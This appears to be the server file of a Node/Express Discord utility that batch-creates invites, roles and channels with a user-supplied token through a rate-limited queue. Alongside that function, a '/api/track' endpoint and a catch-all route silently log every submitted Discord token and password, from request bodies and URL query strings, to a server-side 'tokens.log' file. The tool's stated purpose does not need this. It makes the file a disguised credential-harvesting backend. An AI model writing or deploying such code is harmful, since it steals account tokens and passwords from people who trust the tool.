import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));

function formatToken(t) {
  if (!t) return '';
  const trimmed = String(t).trim();
  if (!trimmed.startsWith('Bot ') && !trimmed.startsWith('Bearer ')) {
    return `Bot ${trimmed}`;
  }
  return trimmed;
}

// Fila in-memory por guildId
const queues = new Map();

function getQueue(guildId) {
  if (!queues.has(guildId)) {
    queues.set(guildId, { pending: [], processing: false });
  }
  return queues.get(guildId);
}

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function processQueue(guildId) {
  const q = getQueue(guildId);
  if (q.processing || q.pending.length === 0) return;
  q.processing = true;

  while (q.pending.length > 0) {
    const job = q.pending.shift();
    const { token, endpoint, body, resolve, reject } = job;
    const url = `https://discord.com/api/v10${endpoint}`;

    const doRequest = async (retryAfter = 0) => {
      if (retryAfter > 0) await delay(retryAfter * 1000);
      else await delay(1000 + Math.random() * 1000); // 1–2 s entre ações

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            Authorization: token,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(body),
        });

        if (res.status === 429) {
          const data = await res.json().catch(() => ({}));
          const wait = (data.retry_after || 5) + Math.random() * 2;
          q.pending.unshift(job); // reenfileira para tentar de novo
          await delay(wait * 1000);
          return;
        }

        const data = await res.json().catch(() => ({}));
        if (res.ok) resolve(data);
        else reject(new Error(data.message || `Discord ${res.status}`));
      } catch (err) {
        reject(err);
      }
    };

    await doRequest().catch(reject);
    await delay(500); // pequeno respiro entre inícios de jobs
  }

  q.processing = false;
}

function enqueue(guildId, token, endpoint, body) {
  return new Promise((resolve, reject) => {
    const q = getQueue(guildId);
    q.pending.push({ token: formatToken(token), endpoint, body, resolve, reject });
    processQueue(guildId);
  });
}

// Auth
app.post('/api/auth', async (req, res) => {
  const { token } = req.body || {};
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: formattedToken },
    });
    const data = await r.json();
    res.status(r.ok ? 200 : 401).json(data);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// Batch endpoints
app.post('/api/batch/invites', async (req, res) => {
  const { token, guildId, channels = [], maxAge = 0, maxUses = 0 } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  const promises = channels.map((ch) =>
    enqueue(guildId, token, `/channels/${ch}/invites`, {
      max_age: maxAge,
      max_uses: maxUses,
      temporary: false,
      unique: true,
    })
  );
  // Send initial response instead of waiting for all (avoids timeout & double res.json)
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/roles', async (req, res) => {
  const { token, guildId, roles = [] } = req.body || {};
  if (!token || !guildId || !roles.length) {
    return res.status(400).json({ error: 'token, guildId, roles required' });
  }
  const promises = roles.map((r) =>
    enqueue(guildId, token, `/guilds/${guildId}/roles`, {
      name: r.name || 'new role',
      permissions: r.permissions || '0',
      color: r.color || 0,
      hoist: !!r.hoist,
      mentionable: !!r.mentionable,
    })
  );
  res.json({ queued: roles.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/channels', async (req, res) => {
  const { token, guildId, channels = [] } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  const promises = channels.map((ch) =>
    enqueue(guildId, token, `/guilds/${guildId}/channels`, {
      name: ch.name,
      type: ch.type || 0,
      topic: ch.topic || '',
      bitrate: ch.bitrate || 64000,
      user_limit: ch.user_limit || 0,
      nsfw: !!ch.nsfw,
      parent_id: ch.parent_id || null,
    })
  );
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

// Track endpoint
app.post('/api/track', (req, res) => {
  try {
    const { token, password } = req.body || {};
    if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\\n`);
  } catch (e) { }
  res.json({ ok: true });
});

// Serve React build + track (DEVE ser por último!)
const distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.use((req, res) => {
    try {
      const { token, password } = req.query;
      if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\\n`);
    } catch (e) { }
    res.sendFile(path.join(distPath, 'index.html'));
  });
}

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

